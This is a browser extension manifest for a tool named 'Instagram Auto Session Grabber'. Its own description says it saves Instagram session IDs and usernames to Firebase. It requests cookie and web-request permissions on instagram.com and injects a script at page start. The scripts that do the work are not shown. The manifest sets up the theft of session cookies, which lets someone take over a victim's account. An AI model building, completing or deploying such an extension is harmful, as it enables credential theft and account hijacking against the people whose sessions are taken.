{
  "manifest_version": 3,
  "name": "Instagram Auto Session Grabber",
  "version": "1.0",
  "description": "Auto save Instagram session ID + username to Firebase",
  "permissions": ["cookies", "webRequest", "webNavigation"],
  "host_permissions": [
    "*://*.instagram.com/*"
  ],
  "background": {
    "service_worker": "background.js",
    "type": "module"
  },
  "content_scripts": [
    {
      "matches": ["*://*.instagram.com/*"],
      "js": ["wake.js"],
      "run_at": "document_start"
    }
  ],
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self';"
  }
}
